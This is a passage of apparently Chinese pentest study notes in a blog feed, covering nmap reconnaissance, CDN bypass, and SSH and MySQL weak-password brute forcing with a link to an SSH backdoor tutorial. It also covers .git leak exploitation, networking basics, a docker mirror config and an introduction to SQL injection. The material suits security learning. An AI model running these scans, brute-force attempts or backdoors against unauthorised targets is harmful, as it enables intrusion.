</p><ul><li><p>-sS：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要3次握手，  而-sS选项不需要3次握手）  </p></li><li><p>优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描  攻击），扫描速度快，效率高，在工作中使用频率最高  缺点：它需要root&#x2F;administrator权限执行  </p></li><li><p>-Pn：扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描  </p></li><li><p>-iL：导入需要扫描的列表</p></li></ul></blockquote><p>扫描常见的的端口信息</p><blockquote><p>  nmap -sS  -T4 -Pn -oG TopTCP -iL LiveHosts.txt  </p><p>  系统扫描  </p><p>  nmap -O  -T4 -Pn -oG OSDetect -iL LiveHosts.txt  </p><p>  版本检测  </p><p>  nmap -sV  -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt  </p></blockquote><p>nmap还可以进行简单的漏洞扫描</p><blockquote><p>nmap.exe -p445 -v –script smb-ghost 192.168.1.0&#x2F;24</p></blockquote></li><li><p>C段查询</p><p>也就是说有可能附近的IP地址是目标的IP</p><p>有两种方法</p><p>python2 脚本  我还是比较常用nmap</p><blockquote><p><a href="https://github.com/se55i0n/Cwebscanner">se55i0n&#x2F;Cwebscanner: 快速扫描C段web应用，获取请求状态code、server、title信息 (github.com)</a></p></blockquote><p>nmap</p><blockquote><p>nmap -sP <a href="http://www.xxx.com/24">www.XXX.com/24</a>  </p><p>nmap -sP 192.168.1.*  </p></blockquote></li><li><p>CDN</p><p>内容分发网路，可以简单的理解为就近访问</p><p>一个网站可能布置多个IP</p><p>对于寻找真是的IP可能对于我们有难度，可以使用多地ping，国外ping，nslookup(是否存在addresses复数  cname(cnd的核心技术)可以理解为别名 )</p><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>  </p></blockquote><p> 如果发现布置了CDN服务，这么解决呢？有两种方法，绕过或者放弃。</p><p><strong>绕过：</strong>    *****</p><ul><li><p>查看子域名（旁站或者C段）</p><p>因为CDN是按照流量收费的，有可能提供者没有给子域名设置CDN</p></li><li><p>国外PING</p></li><li><p>邮件收发服务（旁站或者C段）</p><p>但是必须邮件服务器和网站在同一个C段或者同一个IP才行</p></li><li><p>查询DNS记录，这个是最有效的</p><blockquote><p>A记录：域名变IPV4地址查询的记录</p><p>AAAA记录：域名变成IPV6地址查询的记录</p><p>CNAME记录：就是cname CDN的核心技术</p></blockquote></li></ul><p><strong>放弃：</strong></p><p>放弃寻找真实IP，寻找一个真实IP用于端口扫描</p></li><li><p>端口信息收集</p><p>常见的端口信息</p><blockquote><p>20:  FTP传输控制信息</p><p>21：FTP传输数据</p></blockquote><p><strong>FTP-21：</strong></p><p>ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱</p><p><strong>SSH-22：</strong></p><blockquote><p> （1）弱口令，可使用工具hydra，msf中的ssh爆破模块。  </p><p> （2）SSH后门  <a href="https://blog.csdn.net/weixin_40412037/article/details/117447832">LINUX留后门–教程（二）—— SSH软链接后门_ssh软连接后门-CSDN博客</a></p><p> （3）openssh 用户枚举 CVE-2018-15473。（<a href="https://www.anquanke.com/post/id/157607%EF%BC%89">https://www.anquanke.com/post/id/157607</a></p></blockquote><p><strong>www-80：</strong></p><p>http开放的端口主要是用于万维网传输信息的协议</p><p>可能存在的漏洞有</p><blockquote><p>中间件  IIS  apache  ngnix等</p></blockquote><p><strong>MySQL-3306：</strong></p><blockquote><p>弱密码爆破</p><p>登录</p><p>获取敏感信息</p></blockquote><p><strong>RDP-3389：</strong></p><p>windows远程桌面服务默认监听的端口</p><p><strong>redis-6379：</strong></p><p><strong>Weblogic-7001：</strong></p><p><strong>Tomcat-8080：</strong></p><p><strong>Oracle-1521</strong>  </p><p><strong>SQL server-1433</strong></p><p><strong>Postgresql-</strong></p></li></ol><h3 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h3><ol><li><p>通过ping返回的TTL值判断是什么系统的服务器</p><p>linux TTL一般小于100</p><p>win一般大于100</p></li><li><p>CMS</p></li></ol><h3 id="敏感文件-1"><a href="#敏感文件-1" class="headerlink" title="敏感文件"></a>敏感文件</h3><ol><li><p>常见的敏感文件</p><blockquote><p>robots.txt（一般都会存在，显示的内容就是网站使用的文件目录)<br>crossdomain.xml<br>sitemap.xml<br>后合目录<br>网站安装目录<br>网站上传目录<br>mysql管理页面<br>phpinfo<br>网站文本编辑器<br>测试文件<br>网站备份文件（.rar、.zip、.7z、tar、.gz、.bak)←<br>DS_Store文焦←<br>vim编辑器备份文侏（.swp）<br>WEB-lNF&#x2F;web.xml文件</p></blockquote></li><li><p>robots.txt  </p><p>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访问的部分，或者指定搜  索引擎只收录指定的内容。当一个搜索引擎访问一个站点时，它会首先检查该站点根 目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取</p></li><li><p>crossdomain.xml</p><p> 跨域，顾名思义就是需要的资源不在自己的域服务器上，需要访问其他域服务器。跨域策略文件是一个xml文档文  件，主要是为web客户端(如Adobe Flash Player等)设置跨域处理数据的权限。  </p><p>可以使用谷歌搜索语法</p><blockquote><p>  inurl:crossdomain  filetype:xml intext:allow-access-from  </p></blockquote></li><li><p>操作系统</p><ul><li><p>ping</p><p>可以使用ping 看生存时间windows一般是在128</p><p>linux则是在64，但是这个是一般情况下</p></li></ul></li><li><p>网站服务，容器类型</p><ul><li><p>wappalyzer插件</p><p>该浏览器插件可以查看啊网站用到的相关技术</p></li></ul></li><li><p>脚本类型</p><blockquote><p>php</p><p>jsp</p><p>asp&#x2F;aspx</p><p>python</p></blockquote><p>asp是使用vb语言写的比较老了，aspx是使用.NET框架写的，使用的语言是’C#’  或者’vbs’</p></li><li><p>CMS识别</p><p>内容管理系统，用于网站内容文章管理</p></li><li><p>源代码泄露</p><p>主要是通过搜索github等仓库看是否存在敏感信息</p></li><li><p>.git泄露</p><p>这个可以回复部分文件</p><blockquote><p>  GoogleHacking语法：”.git”  intitle:”index of”  </p><p>  工具：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>  </p><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p></blockquote></li><li><p>看是否存在备份文件</p></li><li><p>目录扫描</p><p>这个很重要</p><p>可以使用dirsearch进行扫描出结果</p></li></ol><h2 id="人员信息，其他信息"><a href="#人员信息，其他信息" class="headerlink" title="人员信息，其他信息"></a>人员信息，其他信息</h2><ol><li>身份信息，社工库</li></ol><h1 id="自动信息收集"><a href="#自动信息收集" class="headerlink" title="自动信息收集"></a>自动信息收集</h1><h2 id="灯塔"><a href="#灯塔" class="headerlink" title="灯塔"></a>灯塔</h2><h2 id="EHole-3-0-new"><a href="#EHole-3-0-new" class="headerlink" title="EHole-3.0-new"></a>EHole-3.0-new</h2><p>识别指纹</p><h3 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h3><h3 id="fofa识别"><a href="#fofa识别" class="headerlink" title="fofa识别"></a>fofa识别</h3><p>选哟配置fofa密钥，邮箱</p><h1 id="相关概念理解"><a href="#相关概念理解" class="headerlink" title="相关概念理解"></a>相关概念理解</h1><h2 id="主动收集和被动收集"><a href="#主动收集和被动收集" class="headerlink" title="主动收集和被动收集"></a>主动收集和被动收集</h2><p><strong>主动收集：</strong></p><blockquote><p>就是访问对应的网站，比如我现在访问百度的网站，就是直接收集，没有流量通过</p></blockquote><p><strong>被动收集：</strong></p><blockquote><p>可以理解为，使用工具去搜集这个信息</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络协议基础</title>
    <link href="/2023/08/19/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/08/19/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="网络协议基础"><a href="#网络协议基础" class="headerlink" title="网络协议基础"></a>网络协议基础</h1><h2 id="网络分层协议"><a href="#网络分层协议" class="headerlink" title="网络分层协议"></a>网络分层协议</h2><h3 id="网络协议分层"><a href="#网络协议分层" class="headerlink" title="网络协议分层"></a>网络协议分层</h3><ul><li>应用层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><ol><li><p>我们直接能够接触到的，我们的手机我们的电脑使用的软件就是在引用层</p></li><li><p>应用层只需要专注于为用户提供应用功能，不去关心数据是如何传播的就类似于，我们寄快递的时候，只需要把包裹交给快递员，由他负责运输快递，我们不需要关心快递是如何被运输的。而且应用层是工作在操作系统中的用户态，传输层及以下则工作在内核态</p></li></ol><h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><ol><li><p>有两个协议TCP（Transmission Control Protocol）和UDP</p></li><li><p>大部分应用使用的正是 TCP传输层协议，比如 HTTP 应用层协议。</p></li><li><p><strong>TCP</strong>保证了数据能可靠的传输给对方。应用需要传输的数据可能会非常大，如果直接传输就不好控制，因此当传输层的数据包大小超过MSS（TCP 最大报文段长度） ，就要将数据包分块，这样即使中途有一个分块丢失或损坏了，只需要重新发送这一个分块，而不用重新发送整个数据包。在 TCP 协议中，我们把每个分块称为一个<br>TCP段（TCP Segment）</p></li><li><p><strong>UDP</strong>只是简单的发送不会保证对方是否接受到</p></li><li><p>当设备作为接收方时，传输层则要负责把数据包传给应用，但是一台设备上可能会有很多应用在接收或者传输数据，因此需要用一个编号将应用区分开来，这个编号就是<strong>端口</strong>。比如80端口通常是Web服务器用的，22端口通常是SSH远程登录服务器用的。而对于浏览器（客户端）中的每个标签栏都是一个独立的进程，操作系统会为这些进程分配临时的端口号。<br>由于传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用。</p><p>说白了就是用于区分不同的信息有不同的去处</p></li></ol><h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ol><li><p>网络层并不负责将数据从一个设备传输到另一个设备</p></li><li><p>只需要服务好应用即可，让其作为应用间数据传输的媒介，帮助实现应用到应用的通信，而实际的传输功能就交给下一层，也就是<br>网络层（InternetLayer）</p></li><li><p>网络层最常使用的IP协议</p><p>IP 协议会将传输层的报文作为数据部分，再加上IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（以太网中一般为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文。</p></li><li><p>为了查询地址方便，需要将IP地址分成两种意义</p><ul><li>网络号：标识网络号是属于哪个子网</li><li>主机号：标识同一个子网下的不同的主机</li></ul><p>怎么分的呢？这需要配合<strong>子网掩码</strong>才能算出 IP 地址 的网络号和主机号。那么在寻址的过程中，先匹<br>配到相同的网络号，才会去找对应的主机。<br>除了寻址能力， IP 协议还有另一个重要的能力就是<strong>路由</strong>。实际场景中，两台设备并不是用一条网线连接起来的，而是通过很多网关、路由器、交换机等众多网络设备连接起来的，那么就会形成很多条网<br>络的路径，因此当数据包到达一个网络节点，就需要通过算法决定下一步走哪条路径。</p><p>IP 协议的寻址作用是告诉我们去往下一个目的地该朝哪个方向走，路由则是根据「下一个目的地」选择路径。寻址更像在导航，路由更像在操作方向盘</p></li></ol><h4 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h4><ol><li>一旦数据需要跨网络传输，就需要有一个设备同时在两个网络当中，这个设备一般是路由器，路由器<br>可以通过路由表计算出下一个要去的 IP 地址。</li><li>每一台设备的网卡都会有一个 MAC 地址，它就是用来唯一标识设备的。路由器计算出了下一个目的地<br>IP 地址，再通过 ARP 协议找到该目的地的 MAC 地址，这样就知道这个 IP 地址是哪个设备的了。</li></ol><h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><ol><li>主要他提供二进制的传输协议服务</li></ol><h2 id="IP详解"><a href="#IP详解" class="headerlink" title="IP详解"></a>IP详解</h2><h3 id="IP基础知识"><a href="#IP基础知识" class="headerlink" title="IP基础知识"></a>IP基础知识</h3><ol><li><p>IP的作用</p><p>TCP&#x2F;IP处于第三层网络层</p><p>网络层的作用：实现主机与主机之间的通信，也叫点对点通信</p></li><li><p>IP和MAC的关系</p><p>MAC负责实现<strong>直连</strong>的两个设备之间的通信，而IP负责<strong>没有直连</strong>的两个网络中</p><p>在网络中数据包传输中，源IP地址和目标IP地址在传输过程中是<strong>不会变化</strong>的，只有源 MAC 地址和目标 MAC <strong>一直在变化</strong>。</p></li></ol><h3 id="IP地址基础知识"><a href="#IP地址基础知识" class="headerlink" title="IP地址基础知识"></a>IP地址基础知识</h3><ol><li><p><code>IPV4</code>是由32为01组成的4组01，也就是说每一各组就是8位</p></li><li><p>IP地址的分类，分成了5类，A,B,C,D,E</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819175436479.png" alt="image-20230819175436479"></p><p>只有A,B,C类才会分，网络号和主机号</p></li><li><p>判断分类</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819175908124.png" alt="image-20230819175908124"></p></li><li><p>私有IP</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819175936318.png" alt="image-20230819175936318"></p></li></ol><h3 id="IP协议相关技术"><a href="#IP协议相关技术" class="headerlink" title="IP协议相关技术"></a>IP协议相关技术</h3><p>跟 IP 协议相关的技术也不少，接下来说说与 IP 协议相关的重要且常见的技术。</p><ul><li>DNS 域名解析</li><li>ARP 与 RARP 协议 </li><li>DHCP 动态获取 IP 地址</li><li>NAT 网络地址转换</li><li>ICMP 互联网控制报文协议</li></ul><ol><li><p>DNS域名解析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819180737171.png" alt="image-20230819180737171"></p></li><li><p>DHCP 动态获取 IP 地址</p><p>工作流程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819180924981.png" alt="image-20230819180924981"></p></li></ol><h2 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h2><ol><li><p>url和uti</p><p>url的固定的语法</p><blockquote><p>protocol:&#x2F;&#x2F;[[user[:password]@]host[:port]][&#x2F;path][?query][#fragment]<br>[协议名]:&#x2F;&#x2F;用户名:密码@主机名:端口&#x2F;路径?查询参数#片段ID</p></blockquote><p>也就是说一个url常见的的组成是：</p><ul><li><p>协议名</p></li><li><p>域名</p></li><li><p>端口</p><p>https默认的端口是443</p><p>http默认的端口是80</p></li><li><p>&#x2F;后面表示的是路径</p></li><li><p>?后面表示的参数</p></li></ul><p>例如：</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages">https://en.wikipedia.org:443/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages</a></p></blockquote></li><li><p>uri  统一资源标识符</p><p>下面是uri和url的关系</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230820104232492.png" alt="image-20230820104232492"></p></li><li><p>http客户端请求信息</p><p>http请求四个部分组成</p><ul><li>请求行</li><li>请求头部</li><li>空行</li><li>请求正文</li></ul></li><li><p>请求方法</p><p>就是在请求行一个部分的字符</p><p><strong>GET</strong> 请求获取Request-URI所标识的资源<br><strong>POST</strong> 在Request-URI所标识的资源后附加新的数据<br><strong>HEAD</strong> 请求获取由Request-URI所标识的资源的响应消息报头 </p><p><strong>PUT</strong> 请求服务器存储一个资源，并用Request-URI作为其标识 </p><p><strong>DELETE</strong> 请求服务器删除Request-URI所标识的资源<br><strong>TRACE</strong> 请求服务器回送收到的请求信息，主要用于测试或诊断<br><strong>OPTIONS</strong> 请求查询服务器的性能，或者查询与资源相关的选项和需求<br><strong>CONNECT</strong> 保留将来使用，HTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器<br><strong>PATCH</strong> 用于将局部修改应用到资源。（由  RFC 5789 指定的方法）</p><ul><li>get主要和post 的区别<ul><li>get负责字符传输，传参的时候是url里面传参数</li><li>post负责流媒体等超文本的传输，使用字节传输</li></ul></li></ul></li><li><p>五大http状态码</p><ul><li>100 继续</li><li>200 成功</li><li>302 跳转，重定向</li><li>404 访问资源不存在</li><li>403 访问不允许</li><li>405 请求方式不允许</li><li>5XX 服务器错误</li></ul></li></ol><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>HTTP 是超文本传输协议，也就是<strong>H</strong>yperText <strong>T</strong>ransfer <strong>P</strong>rotocol</p><h3 id="http常见的字段"><a href="#http常见的字段" class="headerlink" title="http常见的字段"></a>http常见的字段</h3><h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p>客户端发送请求的时候，用来指定服务器的域名</p><blockquote><p>host: <a href="http://www.a.com/">www.a.com</a></p></blockquote><h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a><em>Content-Length</em></h4><p>表明本次回应的长度是多少</p><h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a><em>Connection</em></h4><p>是否是TCP持久通信</p><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a><em>Content-Type</em></h4><p>高速客户端本次的数据是什么格式</p><h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a><em>Content-Encoding</em></h4><p>说明数据的压缩方法</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li><p><em>Content-Encoding</em> </p><p>通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态</p></li><li><p>post提交数据的几种Content-Type</p><ul><li>application&#x2F;x-www-form-urlencoded：最常见的POST提交数据方式，浏览器支持的原生form  表单</li><li>multipart&#x2F;form-data：这种方式一般用来上传文件</li><li>application&#x2F;json：在响应头中很常见，在请求头中用来告诉服务端消息主体是序列化后的json  字符串</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>阿里云docker加速</title>
    <link href="/2023/08/19/others/%E9%98%BF%E9%87%8C%E4%BA%91docker%E5%8A%A0%E9%80%9F/"/>
    <url>/2023/08/19/others/%E9%98%BF%E9%87%8C%E4%BA%91docker%E5%8A%A0%E9%80%9F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">容器镜像服务 (aliyun.com)</a></p><blockquote><p>sudo mkdir -p &#x2F;etc&#x2F;docker </p><p>sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-‘EOF’</p><p> {</p><p>  “registry-mirrors”: [“<a href="https://apdrkepd.mirror.aliyuncs.com"]">https://apdrkepd.mirror.aliyuncs.com&quot;]</a> </p><p>}</p><p>EOF </p><p>sudo systemctl daemon-reload </p><p>sudo systemctl restart docker</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透基础</title>
    <link href="/2023/08/19/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/08/19/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><p>由于现在的网站有WAF，并且有一些是基于框架的，所以现在这些漏洞都不是很常见</p><p>如果有的话，也有可能得到的数据都是强加密过的数据，得到了也没有什么用</p><h2 id="web安全-基础环境搭建"><a href="#web安全-基础环境搭建" class="headerlink" title="web安全-基础环境搭建"></a>web安全-基础环境搭建</h2><h2 id="web安全-sql注入"><a href="#web安全-sql注入" class="headerlink" title="web安全-sql注入"></a>web安全-sql注入</h2><h3 id="sql简介"><a href="#sql简介" class="headerlink" title="sql简介"></a>sql简介</h3><ol><li><p>什么是sql</p><p>  SQL是一种数据库查询和程序设计语言。用于存取数据以及查询、更新和管理关系数据库系统。  </p><p>  常见的SQL数据库有MySQL，SQL server，Oracle、Sybase、db2….不同的数据库所使用的SQL语句也  </p><p>不一样。</p></li><li><p>mysql的数据结构</p><p>  数据库中包含表，表是由列组成，表的数据存储方式是按行存储。</p></li></ol><h3 id="mysql语句"><a href="#mysql语句" class="headerlink" title="mysql语句"></a>mysql语句</h3><ol><li><p>select</p><p>  用于从表中选取数据。结果被存储在一个结果表中（称为结果集）。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>SELECT 列名 FROM 表名<br>SELECT * FROM 表名<br><br></code></pre></td></tr></table></figure></li><li><p>insert info</p><p>用于向表中插入新的<strong>行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>INSERT INTO 表名称 VALUES (值1, 值2,....)<br>INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)<br><br></code></pre></td></tr></table></figure></li><li><p>delete </p><p>用于删除表中的行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>DELETE FROM 表名称 WHERE 列名称 = 值<br>DELETE * FROM 表名称<br><br></code></pre></td></tr></table></figure></li><li><p>updatte</p><p>用于修改表中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值<br><br></code></pre></td></tr></table></figure></li><li><p>oder by</p><p>用于对结果集进行排序。  </p><p>用于根据指定的列对结果集进行排序。  </p><p>默认按照升序对记录进行排序；  </p><p>按照降序对记录排序，使用DESC关键字；  </p><p>order by 排序列数大于当前查询的列数时就会报错； </p><p> sql注入利用这个特性来判断列数以及显示位。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152001672.png" alt="image-20230823152001672"></p></li><li><p>where</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 有条件地从表中选取数据<br># 语法：<br>SELECT 列名称 FROM 表名称 WHERE 列 运算符 值<br><br></code></pre></td></tr></table></figure></li><li><p>AND 和 OR运算符</p><p>AND 和 OR  可在 WHERE 子语句中把两个或多个条件结合起来。  </p><p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。  </p><p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152402216.png" alt="image-20230823152402216"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152421200.png" alt="image-20230823152421200"></p></li><li><p>注释符</p><ul><li><p>注释符可以替代空格</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152602583.png" alt="image-20230823152602583"></p><p>有些时候可能对方不接受空格，所以使用注释符的形式</p></li><li><p>内联注入</p><blockquote><p>  &#x2F;<em>!&#x2F;</em>!*&#x2F;  </p><p>&#x2F;* *&#x2F; 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</p></blockquote></li></ul></li><li><p>连接</p><ul><li><p>数据库的连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式 mysql -u 用户名 -p 密码 -h 主机地址<br>mysql –uroot -proot -h 127.0.0.1<br><br></code></pre></td></tr></table></figure></li><li><p>列出当前的mysql的相关状态信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">status;<br></code></pre></td></tr></table></figure></li><li><p>显示所有的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show databases;<br></code></pre></td></tr></table></figure></li><li><p>打开数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use mysql<br></code></pre></td></tr></table></figure></li><li><p>显示数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show tables<br></code></pre></td></tr></table></figure></li><li><p>显示表结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：describe 数据表名;<br>describe user;<br># 格式：show columns from 数据表名;<br>show columns from user;<br><br></code></pre></td></tr></table></figure></li><li><p>清空数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：delete from 数据表名;<br>delete from test01;<br># 格式：truncate table 数据表名;<br>truncate table test01;<br><br></code></pre></td></tr></table></figure></li><li><p>显示表的创建过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：show create table 表名;<br>show create table user;<br><br></code></pre></td></tr></table></figure></li><li><p>删除表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：drop table 数据表;<br>drop table test01;<br><br></code></pre></td></tr></table></figure></li><li><p>退出数据库连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">exit<br></code></pre></td></tr></table></figure></li></ul></li><li><p>mysql的系统表</p><ul><li>information_schema</li></ul><p>  在 MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于  MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权  限等。  </p><ul><li><p><strong>SCHEMATA</strong> 表：提供了当前mysql实例中所有数据库的信息。  <strong>show</strong> databases*;* 的结果取之此表。  </p></li><li><p>TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个<strong>schema</strong>，表类型，表引擎，创建  时间等信息。  </p><p>  <strong>show</strong> tables from <strong>schemaname;</strong> (<strong>schemaname</strong>为指定数据库名**)**的结果取之此表。  </p></li><li><p>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。  <strong>show</strong> columns from <strong>schemaname.tablename;</strong> (<strong>schemaname</strong>为指定数据库名**,** tablename为指定数据 库下的数据表名)的结果取之此表。</p></li></ul><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823153825533.png" alt="image-20230823153825533"></p></li></ol><h3 id="mysql注入的原理"><a href="#mysql注入的原理" class="headerlink" title="mysql注入的原理"></a>mysql注入的原理</h3><ol><li><p>什么是sql注入</p><p> 利用现有应用程序，将恶意的SQL命令注入到程序后台并在数据库引擎执行的能力。  SQL注入漏洞是由于WEB应用程序对用户输入的数据合法性判断不严格导致。  </p><p>攻击者把SQL命令语句作为输入被服务器SQL解释器正确解析执行，数据库把查询到的结果返回给服  